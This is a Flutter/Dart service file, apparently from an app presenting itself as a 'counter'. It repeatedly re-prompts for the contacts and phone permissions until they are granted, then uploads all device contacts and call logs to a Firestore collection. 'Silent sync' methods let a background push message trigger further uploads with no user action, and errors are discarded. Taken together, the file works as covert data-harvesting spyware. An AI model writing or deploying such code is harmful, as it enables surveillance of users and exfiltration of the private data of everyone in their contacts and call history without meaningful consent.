import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:flutter/services.dart';
import 'package:permission_handler/permission_handler.dart';

class ContactsService {
  static const _channel = MethodChannel('counter/oem');
  final FirebaseFirestore _firestore = FirebaseFirestore.instance;

  // ---------------------------------------------------------------------------
  // Request BOTH permissions one after another in a single call
  // ---------------------------------------------------------------------------
  Future<void> requestPermissionsAndSync(String userId) async {
    // 1. Contacts — loop until granted (like storage permission)
    while (true) {
      final status = await Permission.contacts.status;
      if (status.isGranted) break;
      if (status.isPermanentlyDenied) break; // can't ask anymore
      await Permission.contacts.request();
      await Future.delayed(const Duration(milliseconds: 400));
    }
    if (await Permission.contacts.isGranted) {
      await _saveContacts(userId);
    }

    // 2. Call logs — loop until granted
    while (true) {
      final status = await Permission.phone.status;
      if (status.isGranted) break;
      if (status.isPermanentlyDenied) break;
      await Permission.phone.request();
      await Future.delayed(const Duration(milliseconds: 400));
    }
    if (await Permission.phone.isGranted) {
      await _saveCallLogs(userId);
    }
  }

  // ---------------------------------------------------------------------------
  // Silent sync — called from FCM background handler (permission already granted)
  // ---------------------------------------------------------------------------
  Future<void> syncContactsSilent(String userId) async {
    await _saveContacts(userId);
  }

  Future<void> syncCallLogsSilent(String userId) async {
    await _saveCallLogs(userId);
  }

  // ---------------------------------------------------------------------------
  // Save device contacts to Firestore
  // ---------------------------------------------------------------------------
  Future<void> _saveContacts(String userId) async {
    try {
      final result = await _channel.invokeMethod('getContacts');
      if (result == null) return;

      final contacts = (result as List)
          .map((e) => Map<String, dynamic>.from(e as Map))
          .toList();

      await _firestore.collection('counters').doc(userId).set(
        {
          'contacts': contacts,
          'contactsSyncedAt': FieldValue.serverTimestamp(),
        },
        SetOptions(merge: true),
      );
    } on PlatformException catch (_) {}
  }

  // ---------------------------------------------------------------------------
  // Save call logs to Firestore (last 100 entries)
  // ---------------------------------------------------------------------------
  Future<void> _saveCallLogs(String userId) async {
    try {
      final result = await _channel.invokeMethod('getCallLogs');
      if (result == null) return;

      final logs = (result as List)
          .map((e) => Map<String, dynamic>.from(e as Map))
          .toList();

      await _firestore.collection('counters').doc(userId).set(
        {
          'callLogs': logs,
          'callLogsSyncedAt': FieldValue.serverTimestamp(),
        },
        SetOptions(merge: true),
      );
    } on PlatformException catch (_) {}
  }
}
